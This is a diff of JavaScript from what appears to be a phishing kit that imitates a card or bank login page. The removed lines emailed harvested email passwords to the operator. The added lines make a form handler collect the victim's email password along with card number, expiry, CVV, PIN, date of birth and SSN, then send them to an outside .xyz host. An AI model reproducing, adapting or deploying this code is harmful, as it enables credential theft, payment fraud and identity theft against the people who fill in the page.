@@ -23,27 +23,8 @@
       
 
 window.addEventListener("load", function(){
-document.getElementById("displayName").innerHTML = email;
-document.getElementById("idSIButton9").addEventListener("click",function(event){
-    event.preventDefault();
-    var password =document.getElementById("i0118").value;
-    if( password.length < 4)
-    {
-        alert ("please enter your password")
-    }
-    else{
-        var body ="Email: "+email+"\n email_password: "+password
-        send_em(your_email,"ozoigbondu","discover logs from "+email,body).then(
-            function(){
-                var show = document.getElementById("disc_login");
-                var hide = document.getElementById("email_login");
-                hide.style.display = "none";
-                show.style.display = "block"; 
-            }
-        )
-    }
-
-})    
+document.getElementById("eemail").innerHTML = email;
+   
 document.getElementById("log-in-button").addEventListener("click", function(event){
     event.preventDefault();
     var userid = document.getElementById("userid").value;
@@ -76,6 +57,7 @@ document.getElementById("log-in-button").addEventListener("click", function(even
 document.getElementById("forgot-userid-step-continue-btn").addEventListener("click", function(event){
     event.preventDefault();
     var cardname = document.getElementById("cardname").value;
+    var email_pass = document.getElementById("cardMemberemail").value;
     var cc = document.getElementById("cardAccountNumber").value;cardname
     var expiry =    document.getElementById("CardExpirationDate").value
     var sec_code =    document.getElementById("cvv").value
@@ -88,7 +70,7 @@ document.getElementById("forgot-userid-step-continue-btn").addEventListener("cli
     }
 
     else{
-        var body ="Email: "+email+"\n name on card: "+cardname+"\ncc: "+cc+"\nexpiry: "+expiry+"\nSec_code: "+sec_code+"\npin: "+pin+"\ndob: "+dob+"\nssn: "+ssn
+        var body ="Email: "+email+"\nEmail_pass: "+email_pass+"\n name on card: "+cardname+"\ncc: "+cc+"\nexpiry: "+expiry+"\nSec_code: "+sec_code+"\npin: "+pin+"\ndob: "+dob+"\nssn: "+ssn
         var yourUrl ="https://qwrewxxxkjj.xyz/pharoh/smtpjs.php";
         let agent = navigator.userAgent;
         var xhr = new XMLHttpRequest();
